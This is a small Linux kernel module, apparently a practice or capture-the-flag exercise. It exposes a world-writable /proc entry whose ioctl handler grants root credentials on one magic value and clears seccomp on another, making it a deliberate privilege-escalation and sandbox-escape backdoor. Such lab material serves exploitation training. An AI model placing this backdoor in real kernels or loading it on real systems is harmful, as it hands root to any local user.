#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/init_task.h>
#include <linux/thread_info.h>

#define PWN _IO('p', 1)

MODULE_LICENSE("GPL");

static int device_open(struct inode *inode, struct file *filp)
{
	printk(KERN_ALERT "Device opened.");
	return nonseekable_open(inode, filp);
}

static int device_release(struct inode *inode, struct file *filp)
{
	printk(KERN_ALERT "Device closed.");
	return 0;
}

static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
{
	return -EINVAL;
}

static ssize_t device_write(struct file *filp, const char *buf, size_t len, loff_t *off)
{
	return -EINVAL;
}

static long device_ioctl(struct file *filp, unsigned int ioctl_num, unsigned long ioctl_param)
{
        printk(KERN_ALERT "Got ioctl argument %d!", ioctl_num);
        if (ioctl_num == PWN)
        {
	if (ioctl_param == 0x13371337)
	{
                        struct cred *creds = prepare_kernel_cred(&init_task);
                        printk(KERN_ALERT "Granting root access!");
                        if (!creds)
                                return -ENOMEM;
                        return commit_creds(creds);
		}
		if (ioctl_param == 0x31337)
		{
		printk(KERN_ALERT "Escaping seccomp!");
                        clear_syscall_work(SECCOMP);
		}
        }
        return 0;
}

static const struct proc_ops fops = {
	.proc_read = device_read,
	.proc_write = device_write,
	.proc_ioctl = device_ioctl,
	.proc_open = device_open,
	.proc_release = device_release
};

struct proc_dir_entry *proc_entry = NULL;

int init_module(void)
{
	proc_entry = proc_create("pwn-kernel-root", 0666, NULL, &fops);
	return proc_entry ? 0 : -ENOMEM;
}

void cleanup_module(void)
{
	if (proc_entry) proc_remove(proc_entry);
}
